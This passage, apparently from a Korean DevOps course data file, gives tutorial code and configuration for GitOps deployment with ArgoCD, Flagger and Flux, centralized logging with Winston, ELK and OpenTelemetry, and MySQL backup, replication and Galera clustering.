      mysqldump -u root -p$DB_PASSWORD mydb > backup_$(date +%Y%m%d_%H%M%S).sql

      # 마이그레이션 실행
      npm run migrate

      # 실패 시 롤백
      if [ $? -ne 0 ]; then
        echo "Migration failed, restoring backup"
        mysql -u root -p$DB_PASSWORD mydb < backup_*.sql
        exit 1
      fi
    EOF

# package.json
{
  "scripts": {
    "migrate": "npx sequelize-cli db:migrate",
    "migrate:undo": "npx sequelize-cli db:migrate:undo"
  }
}

# migrations/20240101000000-add-column.js
module.exports = {
  up: async (queryInterface, Sequelize) => {
    await queryInterface.addColumn('users', 'phone', {
      type: Sequelize.STRING,
      allowNull: true
    });
  },

  down: async (queryInterface, Sequelize) => {
    await queryInterface.removeColumn('users', 'phone');
  }
};`},{heading:"⚡ 중급 실습 과제",checklist:["Blue-Green 배포 구현 후 무중단 배포 성공 확인","Canary 배포로 10% → 50% → 100% 점진적 배포 실행","헬스 체크 실패 시 자동 롤백되는지 테스트","Docker 이미지에 Git SHA 태그 자동 추가하여 버전 추적","데이터베이스 마이그레이션 실패 시 자동으로 백업 복원"]}]},advanced:{title:"고급: GitOps와 멀티 클러스터 배포",sections:[{heading:"📚 학습 목표",content:"GitOps 방식으로 선언적 배포를 구현하고, Kubernetes에서 고급 배포 전략을 사용할 수 있다."},{heading:"1. ArgoCD로 GitOps 구현",code:`# Kubernetes 매니페스트를 Git으로 관리
# k8s/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
spec:
  replicas: 3
  selector:
    matchLabels:
      app: myapp
  template:
    metadata:
      labels:
        app: myapp
        version: v1.2.3
    spec:
      containers:
      - name: myapp
        image: myusername/myapp:v1.2.3
        ports:
        - containerPort: 3000

# ArgoCD Application 정의
# argocd/application.yaml
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: myapp
  namespace: argocd
spec:
  project: default
  source:
    repoURL: https://github.com/myuser/myapp-k8s
    targetRevision: main
    path: k8s
  destination:
    server: https://kubernetes.default.svc
    namespace: production
  syncPolicy:
    automated:
      prune: true
      selfHeal: true
    syncOptions:
    - CreateNamespace=true

# 배포 프로세스:
# 1. Git에 k8s/deployment.yaml 업데이트 (이미지 버전 변경)
# 2. ArgoCD가 자동으로 감지
# 3. Kubernetes 클러스터에 적용
# 4. 헬스 체크 후 완료

# 설치:
kubectl create namespace argocd
kubectl apply -n argocd -f https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml

# 접속:
kubectl port-forward svc/argocd-server -n argocd 8080:443`},{heading:"2. Kustomize로 환경별 설정 관리",code:`# 기본 설정
# base/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
spec:
  replicas: 2
  template:
    spec:
      containers:
      - name: myapp
        image: myapp:latest
        resources:
          requests:
            memory: "128Mi"
            cpu: "100m"

# Staging 환경 오버레이
# overlays/staging/kustomization.yaml
apiVersion: kustomize.config.k8s.io/v1beta1
kind: Kustomization
bases:
- ../../base
namePrefix: staging-
replicas:
- name: myapp
  count: 1
images:
- name: myapp
  newTag: staging-latest

# Production 환경 오버레이
# overlays/production/kustomization.yaml
apiVersion: kustomize.config.k8s.io/v1beta1
kind: Kustomization
bases:
- ../../base
namePrefix: prod-
replicas:
- name: myapp
  count: 5
images:
- name: myapp
  newTag: v1.2.3
patchesStrategicMerge:
- resources.yaml

# overlays/production/resources.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
spec:
  template:
    spec:
      containers:
      - name: myapp
        resources:
          requests:
            memory: "512Mi"
            cpu: "500m"
          limits:
            memory: "1Gi"
            cpu: "1000m"

# 적용:
kubectl apply -k overlays/staging
kubectl apply -k overlays/production`},{heading:"3. Flagger로 자동 Canary 배포",code:`# Flagger 설치
kubectl apply -f https://raw.githubusercontent.com/fluxcd/flagger/main/artifacts/flagger/crd.yaml
kubectl apply -f https://raw.githubusercontent.com/fluxcd/flagger/main/artifacts/flagger/deployment.yaml

# Canary 정의
# canary.yaml
apiVersion: flagger.app/v1beta1
kind: Canary
metadata:
  name: myapp
  namespace: production
spec:
  targetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: myapp
  service:
    port: 80
  analysis:
    interval: 1m
    threshold: 5
    maxWeight: 50
    stepWeight: 10
    metrics:
    - name: request-success-rate
      thresholdRange:
        min: 99
      interval: 1m
    - name: request-duration
      thresholdRange:
        max: 500
      interval: 1m
    webhooks:
    - name: load-test
      url: http://flagger-loadtester/
      timeout: 5s
      metadata:
        cmd: "hey -z 1m -q 10 -c 2 http://myapp-canary/"

# 동작:
# 1. 새 버전 배포 감지
# 2. Canary 파드 생성 (10% 트래픽)
# 3. 1분간 메트릭 측정
# 4. 성공률 99% 이상 & 응답 시간 500ms 이하면 → 20% 증가
# 5. 실패하면 → 롤백
# 6. 50%까지 증가 후 전체 전환`},{heading:"4. 멀티 클러스터 배포",code:`# Flux로 여러 클러스터 관리
# clusters/staging/flux-system/gotk-sync.yaml
apiVersion: source.toolkit.fluxcd.io/v1beta2
kind: GitRepository
metadata:
  name: flux-system
  namespace: flux-system
spec:
  interval: 1m
  url: https://github.com/myuser/fleet-infra
  ref:
    branch: main

# clusters/staging/apps/myapp.yaml
apiVersion: kustomize.toolkit.fluxcd.io/v1beta2
kind: Kustomization
metadata:
  name: myapp
  namespace: flux-system
spec:
  interval: 5m
  path: ./apps/myapp/overlays/staging
  sourceRef:
    kind: GitRepository
    name: flux-system

# clusters/production-us/apps/myapp.yaml
apiVersion: kustomize.toolkit.fluxcd.io/v1beta2
kind: Kustomization
metadata:
  name: myapp
  namespace: flux-system
spec:
  interval: 5m
  path: ./apps/myapp/overlays/production-us
  sourceRef:
    kind: GitRepository
    name: flux-system

# clusters/production-eu/apps/myapp.yaml
apiVersion: kustomize.toolkit.fluxcd.io/v1beta2
kind: Kustomization
metadata:
  name: myapp
  namespace: flux-system
spec:
  interval: 5m
  path: ./apps/myapp/overlays/production-eu
  sourceRef:
    kind: GitRepository
    name: flux-system

# 배포 프로세스:
# 1. Git에 앱 매니페스트 업데이트
# 2. Flux가 모든 클러스터에서 감지
# 3. Staging → Production-US → Production-EU 순차 배포
# 4. 각 클러스터별로 Canary 배포 자동 실행`},{heading:"5. 배포 승인 워크플로우",code:`# GitHub Actions with manual approval
name: Production Deployment

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Build image
        run: docker build -t myapp:\${{ github.sha }} .
      - name: Push image
        run: docker push myapp:\${{ github.sha }}

  request-approval:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - name: Create pull request
        uses: peter-evans/create-pull-request@v5
        with:
          title: "Deploy \${{ github.sha }} to production"
          body: |
            ## Deployment Request
            - Commit: \${{ github.sha }}
            - Author: \${{ github.actor }}
            - Tests: Passed ✅

            Please review and approve to deploy to production.
          branch: deploy/\${{ github.sha }}
          base: main

  deploy-production:
    needs: request-approval
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://myapp.com
    steps:
      - name: Update k8s manifest
        run: |
          git clone https://github.com/myuser/myapp-k8s
          cd myapp-k8s
          sed -i 's|image: myapp:.*|image: myapp:\${{ github.sha }}|' k8s/deployment.yaml
          git commit -am "Deploy \${{ github.sha }}"
          git push

      - name: Wait for ArgoCD sync
        run: |
          argocd app wait myapp --timeout 600

      - name: Smoke test
        run: |
          curl -f https://myapp.com/health || exit 1`},{heading:"6. 배포 메트릭과 SLO 추적",code:`# Prometheus로 배포 메트릭 수집
# deployment-exporter.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: deployment-exporter
spec:
  template:
    spec:
      containers:
      - name: exporter
        image: deployment-exporter:latest
        env:
        - name: GITHUB_TOKEN
          valueFrom:
            secretKeyRef:
              name: github-token
              key: token

# Python 스크립트 (deployment-exporter)
import requests
from prometheus_client import start_http_server, Gauge
import time

DEPLOYMENT_FREQUENCY = Gauge('deployment_frequency', 'Deployments per day')
LEAD_TIME = Gauge('deployment_lead_time_seconds', 'Time from commit to deploy')
MTTR = Gauge('deployment_mttr_seconds', 'Mean time to recovery')
CHANGE_FAILURE_RATE = Gauge('deployment_change_failure_rate', 'Failed deployments %')

def collect_metrics():
    # GitHub API로 배포 정보 수집
    response = requests.get(
        'https://api.github.com/repos/myuser/myapp/actions/runs',
        headers={'Authorization': f'token {GITHUB_TOKEN}'}
    )

    runs = response.json()['workflow_runs']

    # 배포 빈도 계산
    deployments_today = len([r for r in runs if is_today(r['created_at'])])
    DEPLOYMENT_FREQUENCY.set(deployments_today)

    # Lead Time 계산
    for run in runs:
        if run['conclusion'] == 'success':
            lead_time = (run['updated_at'] - run['created_at']).total_seconds()
            LEAD_TIME.set(lead_time)
            break

if __name__ == '__main__':
    start_http_server(8000)
    while True:
        collect_metrics()
        time.sleep(60)

# Grafana 대시보드
# 1. Deployment Frequency: 하루 평균 배포 횟수
# 2. Lead Time: 커밋부터 배포까지 평균 시간
# 3. MTTR: 장애 복구 평균 시간
# 4. Change Failure Rate: 배포 실패율`},{heading:"⚡ 고급 실습 과제",checklist:["ArgoCD로 GitOps 구현 후 Git push만으로 배포 자동화","Kustomize로 Staging/Production 환경 분리하여 각각 다른 설정 적용","Flagger로 Canary 배포 자동화 (성공률 99% 이상일 때만 진행)","3개 클러스터 (Staging, US, EU)에 순차 배포 구현","배포 메트릭 (빈도, Lead Time, MTTR) Prometheus + Grafana로 추적"]}]}}},{id:"4-2",name:"로그 관리와 분석",goal:"로그를 체계적으로 관리하고 인사이트를 얻을 수 있다",hours:12,keywords:["log management","centralized logging","log analysis"],tasks:["중앙 집중식 로그 시스템 구축","로그 검색 및 분석","알림 규칙 설정"],content:{beginner:{title:"초급: 구조화된 로깅과 기본 분석",sections:[{heading:"📚 학습 목표",content:"구조화된 로그를 작성하고, 로그 레벨을 적절히 사용할 수 있다."},{heading:"1. 좋은 로그 vs 나쁜 로그",code:`// 나쁜 로그
console.log("Error");
console.log("User logged in");
console.log("Data:", data);

// 좋은 로그 (Winston 사용)
const winston = require('winston');

const logger = winston.createLogger({
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'app.log' })
  ]
});

logger.error('Database connection failed', {
  error: err.message,
  userId: req.user.id,
  timestamp: new Date().toISOString()
});

logger.info('User login successful', {
  userId: user.id,
  ip: req.ip,
  userAgent: req.headers['user-agent']
});`},{heading:"2. 로그 레벨 활용",code:`// ERROR: 즉시 조치 필요
logger.error('Payment processing failed', {
  orderId: 12345,
  amount: 100,
  error: 'Gateway timeout'
});

// WARN: 주의 필요
logger.warn('API rate limit approaching', {
  remaining: 10,
  limit: 100
});

// INFO: 중요 이벤트
logger.info('Order completed', {
  orderId: 12345,
  userId: 789
});

// DEBUG: 개발 디버깅용
logger.debug('Query executed', {
  sql: 'SELECT * FROM users WHERE id = ?',
  params: [123],
  duration: '15ms'
});`},{heading:"💡 초급 실습 과제",checklist:["Winston으로 구조화된 로그 시스템 구축","로그 레벨별로 다른 파일에 저장 (error.log, combined.log)","요청/응답 미들웨어로 모든 API 호출 로깅"]}]},intermediate:{title:"중급: 중앙 집중식 로그 시스템 (ELK Stack)",sections:[{heading:"📚 학습 목표",content:"Elasticsearch + Kibana로 로그를 중앙에서 관리하고 검색할 수 있다."},{heading:"1. Docker Compose로 ELK Stack 구성",code:`# docker-compose.yml
version: '3.8'
services:
  elasticsearch:
    image: elasticsearch:8.11.0
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
    ports:
      - "9200:9200"

  kibana:
    image: kibana:8.11.0
    ports:
      - "5601:5601"
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200

  logstash:
    image: logstash:8.11.0
    volumes:
      - ./logstash.conf:/usr/share/logstash/pipeline/logstash.conf
    ports:
      - "5000:5000"

# logstash.conf
input {
  tcp {
    port => 5000
    codec => json
  }
}

output {
  elasticsearch {
    hosts => ["elasticsearch:9200"]
    index => "app-logs-%{+YYYY.MM.dd}"
  }
}`},{heading:"2. 애플리케이션에서 Logstash로 전송",code:`const winston = require('winston');
require('winston-logstash');

const logger = winston.createLogger({
  transports: [
    new winston.transports.Logstash({
      port: 5000,
      host: 'localhost',
      node_name: 'my-app'
    })
  ]
});

logger.info('User action', {
  userId: 123,
  action: 'purchase',
  amount: 100
});`},{heading:"⚡ 중급 실습 과제",checklist:["ELK Stack Docker Compose로 구축","애플리케이션 로그를 Logstash로 전송","Kibana에서 실시간 로그 검색 및 대시보드 생성"]}]},advanced:{title:"고급: 분산 추적과 로그 상관관계",sections:[{heading:"📚 학습 목표",content:"OpenTelemetry로 분산 추적을 구현하고, 로그와 트레이스를 연결할 수 있다."},{heading:"1. OpenTelemetry 통합",code:`const { NodeSDK } = require('@opentelemetry/sdk-node');
const { getNodeAutoInstrumentations } = require('@opentelemetry/auto-instrumentations-node');
const { JaegerExporter } = require('@opentelemetry/exporter-jaeger');

const sdk = new NodeSDK({
  traceExporter: new JaegerExporter({
    endpoint: 'http://localhost:14268/api/traces',
  }),
  instrumentations: [getNodeAutoInstrumentations()],
});

sdk.start();

// 로그와 Trace ID 연결
const trace = require('@opentelemetry/api').trace;

app.use((req, res, next) => {
  const span = trace.getActiveSpan();
  const traceId = span?.spanContext().traceId;

  req.logger = logger.child({ traceId });
  next();
});`},{heading:"⚡ 고급 실습 과제",checklist:["OpenTelemetry + Jaeger로 분산 추적 구현","로그에 Trace ID 포함하여 요청 전체 추적","Grafana Loki로 로그 집계 및 알림 설정"]}]}}},{id:"4-3",name:"데이터베이스 고급 운영",goal:"데이터베이스를 전문적으로 관리할 수 있다",hours:20,keywords:["database replication","sharding","high availability"],tasks:["Master-Slave 복제 구성","데이터베이스 백업 자동화","고가용성 클러스터 구축"],content:{beginner:{title:"초급: 데이터베이스 백업과 복구 전략",sections:[{heading:"📚 학습 목표",content:"정기적인 백업을 자동화하고, 다양한 복구 시나리오를 처리할 수 있다."},{heading:"1. 백업 전략의 중요성",content:"데이터 손실은 서비스 종료로 이어질 수 있습니다.",list:["하드웨어 고장: SSD/HDD 장애로 데이터 소실","인적 오류: DROP TABLE 실수로 테이블 삭제","보안 사고: 랜섬웨어 공격으로 DB 암호화","자연재해: 데이터센터 화재/침수"]},{heading:"2. 3-2-1 백업 규칙",code:`# 3-2-1 백업 전략
3: 데이터의 복사본 3개 유지
2: 서로 다른 2가지 매체에 저장 (HDD + SSD, 로컬 + 클라우드)
1: 1개는 오프사이트(원격지)에 보관

# 예시:
- 원본: 운영 서버 MySQL (로컬 SSD)
- 백업 1: 같은 서버 다른 디스크 (로컬 HDD)
- 백업 2: AWS S3 (클라우드)
- 백업 3: 다른 리전 S3 (재해 복구용)`},{heading:"3. mysqldump로 전체 백업",code:`#!/bin/bash
# full-backup.sh

DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_DIR="/var/backups/mysql"
DB_NAME="mydb"
RETENTION_DAYS=7

# 백업 디렉토리 생성
mkdir -p $BACKUP_DIR

# MySQL 전체 백업 (압축)
mysqldump -u root -p\${MYSQL_PASSWORD} \\
  --single-transaction \\
  --quick \\
  --lock-tables=false \\
  \${DB_NAME} | gzip > \${BACKUP_DIR}/\${DB_NAME}_\${DATE}.sql.gz

# 백업 파일 권한 설정
chmod 600 \${BACKUP_DIR}/\${DB_NAME}_\${DATE}.sql.gz

# 백업 성공 확인
if [ $? -eq 0 ]; then
  echo "[$(date)] Backup successful: \${DB_NAME}_\${DATE}.sql.gz" >> /var/log/mysql-backup.log
else
  echo "[$(date)] Backup failed!" >> /var/log/mysql-backup.log
  # Slack 알림
  curl -X POST \${SLACK_WEBHOOK} -d '{"text":"❌ DB Backup Failed!"}'
  exit 1
fi

# 오래된 백업 삭제 (7일 이상)
find \${BACKUP_DIR} -name "*.sql.gz" -mtime +\${RETENTION_DAYS} -delete

# S3 업로드
aws s3 cp \${BACKUP_DIR}/\${DB_NAME}_\${DATE}.sql.gz \\
  s3://my-backup-bucket/mysql/\${DATE}/ \\
  --storage-class STANDARD_IA

echo "[$(date)] Backup uploaded to S3" >> /var/log/mysql-backup.log`},{heading:"4. Cron으로 자동화",code:`# Crontab 편집
crontab -e

# 매일 새벽 3시 전체 백업
0 3 * * * /var/scripts/full-backup.sh

# 매주 일요일 새벽 4시 다른 리전으로 복사
0 4 * * 0 aws s3 sync s3://my-backup-bucket/ s3://my-backup-dr-bucket/ --region us-west-2

# 매 6시간마다 Binary Log 백업
0 */6 * * * mysqlbinlog /var/log/mysql/mysql-bin.* | gzip > /var/backups/binlog_$(date +%Y%m%d_%H).gz

# Cron 로그 확인
tail -f /var/log/cron
tail -f /var/log/mysql-backup.log`},{heading:"5. 백업 복원 절차",steps:[{label:"전체 복원",code:`# 1. 백업 파일 다운로드
aws s3 cp s3://my-backup-bucket/mysql/20240101_030000/mydb_20240101_030000.sql.gz .

# 2. 압축 해제 및 복원
gunzip mydb_20240101_030000.sql.gz
mysql -u root -p mydb < mydb_20240101_030000.sql

# 3. 확인
mysql -u root -p -e "SELECT COUNT(*) FROM mydb.users;"`},{label:"특정 테이블만 복원",code:`# 백업 파일에서 특정 테이블만 추출
zcat mydb_20240101_030000.sql.gz | sed -n '/DROP TABLE.*\`users\`/,/UNLOCK TABLES/p' > users_only.sql

# 복원
mysql -u root -p mydb < users_only.sql`},{label:"Point-in-Time Recovery (특정 시점 복구)",code:`# 시나리오: 오후 2시에 실수로 테이블 삭제, 새벽 3시 백업 있음

# 1. 새벽 3시 백업 복원
mysql -u root -p mydb < mydb_20240101_030000.sql

# 2. Binary Log로 3시~2시까지 재실행
mysqlbinlog --start-datetime="2024-01-01 03:00:00" \\
            --stop-datetime="2024-01-01 14:00:00" \\
            /var/log/mysql/mysql-bin.* | mysql -u root -p mydb

# 결과: 14시 직전 상태로 복구 완료!`}]},{heading:"6. 백업 테스트 자동화",code:`#!/bin/bash
# test-backup.sh

LATEST_BACKUP=$(ls -t /var/backups/mysql/*.sql.gz | head -1)

# 테스트 DB에 복원
gunzip -c \${LATEST_BACKUP} | mysql -u root -p test_restore_db

# 테이블 개수 확인
TABLE_COUNT=$(mysql -u root -p -se "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='test_restore_db'")

if [ \${TABLE_COUNT} -gt 0 ]; then
  echo "[$(date)] Backup test successful: \${TABLE_COUNT} tables restored"
else
  echo "[$(date)] Backup test FAILED!"
  curl -X POST \${SLACK_WEBHOOK} -d '{"text":"❌ Backup Restore Test Failed!"}'
fi

# 테스트 DB 삭제
mysql -u root -p -e "DROP DATABASE test_restore_db"

# 매주 토요일 자동 테스트
# 0 5 * * 6 /var/scripts/test-backup.sh`},{heading:"💡 초급 실습 과제",checklist:["매일 자동 백업 스크립트 작성 및 Cron 등록","백업 파일을 S3에 자동 업로드 설정","7일 이상 된 백업 파일 자동 삭제 확인","전체 백업 파일로 복원 테스트 성공","특정 테이블만 복원하는 스크립트 작성"]}]},intermediate:{title:"중급: Master-Slave 복제와 읽기 분산",sections:[{heading:"📚 학습 목표",content:"Master-Slave 복제를 구성하여 고가용성과 읽기 성능을 향상시킬 수 있다."},{heading:"1. 복제(Replication)의 이점",list:["고가용성: Master 장애 시 Slave를 Master로 승격","읽기 분산: Slave에서 SELECT 쿼리 처리 (성능 2~3배 향상)","백업 부하 감소: Slave에서 백업 수행 (Master 영향 없음)","지리적 분산: 지역별 Slave 배치로 지연 시간 감소"]},{heading:"2. MySQL Master-Slave 설정",steps:[{label:"Master 서버 설정",code:`# /etc/mysql/my.cnf (Master)
[mysqld]
server-id = 1                    # 고유 ID
log_bin = /var/log/mysql/mysql-bin.log
binlog_do_db = mydb              # 복제할 DB
binlog_format = ROW              # ROW 방식 (안전)
expire_logs_days = 7             # Binary Log 7일 보관
max_binlog_size = 100M

# MySQL 재시작
sudo systemctl restart mysql

# 복제 사용자 생성
mysql -u root -p
CREATE USER 'repl'@'%' IDENTIFIED BY 'repl_password';
GRANT REPLICATION SLAVE ON *.* TO 'repl'@'%';
FLUSH PRIVILEGES;

# Master 상태 확인 (binlog 파일명과 위치 기록!)
SHOW MASTER STATUS;
+------------------+----------+--------------+------------------+
| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB |
+------------------+----------+--------------+------------------+
| mysql-bin.000001 |      154 | mydb         |                  |
+------------------+----------+--------------+------------------+`},{label:"Slave 서버 설정",code:`# /etc/mysql/my.cnf (Slave)
[mysqld]
server-id = 2                    # Master와 다른 ID
relay-log = /var/log/mysql/mysql-relay-bin
log_bin = /var/log/mysql/mysql-bin.log
read_only = 1                    # 읽기 전용 (안전)

# MySQL 재시작
sudo systemctl restart mysql

# Master 데이터 복사 (mysqldump)
mysqldump -u root -p --master-data=2 --single-transaction mydb > master_dump.sql

# Slave에 복원
mysql -u root -p mydb < master_dump.sql

# Slave 설정
mysql -u root -p
CHANGE MASTER TO
  MASTER_HOST='192.168.1.100',           # Master IP
  MASTER_USER='repl',
  MASTER_PASSWORD='repl_password',
  MASTER_LOG_FILE='mysql-bin.000001',    # SHOW MASTER STATUS에서 확인
  MASTER_LOG_POS=154;                    # SHOW MASTER STATUS에서 확인

START SLAVE;

# Slave 상태 확인
SHOW SLAVE STATUS\\G

# 중요 필드:
# Slave_IO_Running: Yes
# Slave_SQL_Running: Yes
# Seconds_Behind_Master: 0       # 복제 지연 시간
# Last_Error: (비어있어야 함)`}]},{heading:"3. 애플리케이션에서 읽기/쓰기 분산",code:`// Node.js에서 Master/Slave 분리
const mysql = require('mysql2/promise');

// Master Pool (쓰기 전용)
const masterPool = mysql.createPool({
  host: '192.168.1.100',
  user: 'root',
  password: 'password',
  database: 'mydb',
  connectionLimit: 10
});

// Slave Pool (읽기 전용)
const slavePool = mysql.createPool({
  host: '192.168.1.101',
  user: 'root',
  password: 'password',
  database: 'mydb',
  connectionLimit: 50  // 읽기가 많으므로 더 많은 연결
});

// 읽기 쿼리 → Slave
app.get('/api/users', async (req, res) => {
  const [users] = await slavePool.query('SELECT * FROM users');
  res.json(users);
});

// 쓰기 쿼리 → Master
app.post('/api/users', async (req, res) => {
  await masterPool.query('INSERT INTO users (name, email) VALUES (?, ?)', [
    req.body.name,
    req.body.email
  ]);
  res.json({ success: true });
});

// 여러 Slave가 있을 때 로드 밸런싱
const slaves = [
  mysql.createPool({ host: '192.168.1.101', ... }),
  mysql.createPool({ host: '192.168.1.102', ... }),
  mysql.createPool({ host: '192.168.1.103', ... })
];

function getSlavePool() {
  const index = Math.floor(Math.random() * slaves.length);
  return slaves[index];
}

app.get('/api/products', async (req, res) => {
  const pool = getSlavePool();
  const [products] = await pool.query('SELECT * FROM products');
  res.json(products);
});`},{heading:"4. ProxySQL로 자동 읽기/쓰기 분리",code:`# ProxySQL 설치
docker run -d --name proxysql \\
  -p 6033:6033 \\
  -p 6032:6032 \\
  proxysql/proxysql

# ProxySQL 관리 콘솔 접속
mysql -u admin -padmin -h 127.0.0.1 -P6032

# Master 추가
INSERT INTO mysql_servers(hostgroup_id, hostname, port) VALUES (1, '192.168.1.100', 3306);

# Slave 추가
INSERT INTO mysql_servers(hostgroup_id, hostname, port) VALUES (2, '192.168.1.101', 3306);
INSERT INTO mysql_servers(hostgroup_id, hostname, port) VALUES (2, '192.168.1.102', 3306);

# 쿼리 라우팅 규칙
INSERT INTO mysql_query_rules(active, match_pattern, destination_hostgroup, apply)
VALUES (1, '^SELECT.*FOR UPDATE', 1, 1);  # SELECT FOR UPDATE → Master

INSERT INTO mysql_query_rules(active, match_pattern, destination_hostgroup, apply)
VALUES (1, '^SELECT', 2, 1);  # SELECT → Slave

# 설정 적용
LOAD MYSQL SERVERS TO RUNTIME;
LOAD MYSQL QUERY RULES TO RUNTIME;
SAVE MYSQL SERVERS TO DISK;
SAVE MYSQL QUERY RULES TO DISK;

# 애플리케이션은 ProxySQL만 바라봄
const pool = mysql.createPool({
  host: '127.0.0.1',
  port: 6033,  # ProxySQL 포트
  user: 'root',
  password: 'password',
  database: 'mydb'
});

// 자동으로 SELECT는 Slave, INSERT/UPDATE는 Master로!
const [users] = await pool.query('SELECT * FROM users');  # → Slave
await pool.query('INSERT INTO users VALUES (...)');       # → Master`},{heading:"5. 복제 지연 모니터링",code:`# Prometheus Exporter for MySQL
docker run -d --name mysql-exporter \\
  -p 9104:9104 \\
  -e DATA_SOURCE_NAME="exporter:password@(slave-host:3306)/" \\
  prom/mysqld-exporter

# Prometheus 스크랩 설정 (prometheus.yml)
scrape_configs:
  - job_name: 'mysql-slave'
    static_configs:
      - targets: ['localhost:9104']

# Grafana 알림 규칙
groups:
  - name: mysql-replication
    interval: 30s
    rules:
      - alert: ReplicationLag
        expr: mysql_slave_status_seconds_behind_master > 60
        for: 5m
        annotations:
          summary: "Replication lag is {{ $value }}s"

# 수동 확인 스크립트
#!/bin/bash
LAG=$(mysql -u root -p -e "SHOW SLAVE STATUS\\G" | grep Seconds_Behind_Master | awk '{print $2}')

if [ \${LAG} -gt 60 ]; then
  echo "WARNING: Replication lag is \${LAG} seconds"
  curl -X POST \${SLACK_WEBHOOK} -d "{"text":"⚠️ Replication lag: \${LAG}s"}"
fi`},{heading:"6. Slave 장애 시 자동 제외",code:`# ProxySQL에서 헬스 체크 설정
UPDATE mysql_servers SET max_replication_lag = 10 WHERE hostgroup_id = 2;

# 복제 지연 10초 이상이면 자동으로 라우팅에서 제외
# 복구되면 자동으로 다시 포함

# Keepalived로 Slave VIP 관리
# /etc/keepalived/keepalived.conf
vrrp_script check_mysql {
    script "/usr/local/bin/check_mysql.sh"
    interval 2
}

vrrp_instance VI_1 {
    state MASTER
    interface eth0
    virtual_router_id 51
    priority 100
    virtual_ipaddress {
        192.168.1.200  # Slave VIP
    }
    track_script {
        check_mysql
    }
}

# check_mysql.sh
#!/bin/bash
mysql -u root -p -e "SELECT 1" > /dev/null 2>&1
if [ $? -eq 0 ]; then
  exit 0  # MySQL 정상
else
  exit 1  # MySQL 장애 → VIP를 다른 Slave로 이동
fi`},{heading:"⚡ 중급 실습 과제",checklist:["Master 1대 + Slave 2대 복제 구성 완료","ProxySQL로 자동 읽기/쓰기 분리 설정","복제 지연 60초 이상 시 Slack 알림 설정","Slave 장애 시 자동으로 라우팅에서 제외되는지 확인","읽기 쿼리 부하 테스트 후 Slave로 분산되는지 확인"]}]},advanced:{title:"고급: Multi-Master 클러스터와 자동 페일오버",sections:[{heading:"📚 학습 목표",content:"Galera Cluster로 고가용성 DB 클러스터를 구축하고, 자동 페일오버를 구현할 수 있다."},{heading:"1. Galera Cluster 개념",content:"모든 노드가 Master인 Multi-Master 동기식 복제 클러스터입니다.",list:["동기식 복제: 쓰기가 모든 노드에 동시 적용 (데이터 일관성 보장)","자동 페일오버: 노드 장애 시 자동으로 클러스터에서 제외","읽기/쓰기 모두 분산: 모든 노드에서 INSERT/UPDATE 가능","제로 다운타임: 노드 추가/제거 시에도 서비스 중단 없음"]},{heading:"2. Galera Cluster 구성 (MariaDB)",code:`# docker-compose.yml
version: '3.8'
services:
  galera-node1:
    image: mariadb:latest
    hostname: galera-node1
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: mydb
    volumes:
      - ./node1-data:/var/lib/mysql
      - ./galera.cnf:/etc/mysql/conf.d/galera.cnf
    command: >
      --wsrep-new-cluster
      --wsrep-node-name=node1
      --wsrep-node-address=galera-node1

  galera-node2:
    image: mariadb:latest
    hostname: galera-node2
    environment:
      MYSQL_ROOT_PASSWORD: root
    volumes:
      - ./node2-data:/var/lib/mysql
      - ./galera.cnf:/etc/mysql/conf.d/galera.cnf
    command: >
      --wsrep-node-name=node2
      --wsrep-node-address=galera-node2
      --wsrep-cluster-address=gcomm://galera-node1,galera-node2,galera-node3

  galera-node3:
    image: mariadb:latest
    hostname: galera-node3
    environment:
      MYSQL_ROOT_PASSWORD: root
    volumes:
      - ./node3-data:/var/lib/mysql
      - ./galera.cnf:/etc/mysql/conf.d/galera.cnf
    command: >
      --wsrep-node-name=node3
      --wsrep-node-address=galera-node3
      --wsrep-cluster-address=gcomm://galera-node1,galera-node2,galera-node3

# galera.cnf
[mysqld]
binlog_format=ROW
default-storage-engine=innodb
innodb_autoinc_lock_mode=2
bind-address=0.0.0.0

# Galera 설정
wsrep_on=ON
wsrep_provider=/usr/lib/galera/libgalera_smm.so
wsrep_cluster_name="my-galera-cluster"
wsrep_sst_method=rsync

# 실행
docker-compose up -d

# 클러스터 상태 확인
mysql -u root -p -e "SHOW STATUS LIKE 'wsrep_cluster_size'"
# wsrep_cluster_size | 3  ← 3개 노드 정상`},{heading:"3. HAProxy로 로드 밸런싱 + 헬스 체크",code:`# haproxy.cfg
global
    log stdout format raw local0

defaults
    log     global
    mode    tcp
    option  tcplog
    timeout connect 10s
    timeout client 30s
    timeout server 30s

# MySQL 읽기/쓰기 분산
listen mysql-cluster
    bind *:3306
    mode tcp
    option mysql-check user haproxy_check
    balance roundrobin
    server galera-node1 galera-node1:3306 check
    server galera-node2 galera-node2:3306 check
    server galera-node3 galera-node3:3306 check

# HAProxy 통계 페이지
listen stats
    bind *:8404
    stats enable
    stats uri /
    stats refresh 10s

# docker-compose.yml에 추가
  haproxy:
    image: haproxy:latest
    volumes:
      - ./haproxy.cfg:/usr/local/etc/haproxy/haproxy.cfg
    ports:
      - "3306:3306"
      - "8404:8404"
    depends_on:
      - galera-node1
      - galera-node2
      - galera-node3

# 헬스 체크 사용자 생성 (각 노드에서)
CREATE USER 'haproxy_check'@'%';
FLUSH PRIVILEGES;

# 애플리케이션은 HAProxy만 바라봄
const pool = mysql.createPool({
  host: 'haproxy',  # HAProxy
  port: 3306,
  user: 'root',
  password: 'root',
  database: 'mydb'
});

// 어느 노드에 연결되든 상관없이 쓰기/읽기 모두 가능
